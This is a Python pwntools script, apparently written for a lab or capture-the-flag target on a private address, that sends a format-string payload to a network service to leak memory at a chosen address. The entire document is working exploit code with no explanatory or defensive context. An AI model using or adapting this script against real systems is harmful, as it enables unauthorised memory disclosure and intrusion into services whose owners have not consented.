#!/usr/bin/env python3
from pwn import *

# Define target IP and port
target_host = '192.168.64.6'
target_port = 200

# Define the address you want to read
address_to_read = 0x0804c090

# Construct the payload
payload = (
    p32(address_to_read) +  # Address to read in little-endian format
    b"%08x-" * 12 + b"%s"  # Format specifiers to read the data as a string
).rstrip(b"-")

# Create the exploit code
exploit_code = payload + b"\n"

# Connect to the target using netcat
io = remote(target_host, target_port)

# Send the exploit code
io.send(exploit_code)

# Receive and print the response
#response = io.recvall()
#print(response.decode())

# Close the connection
io.close()


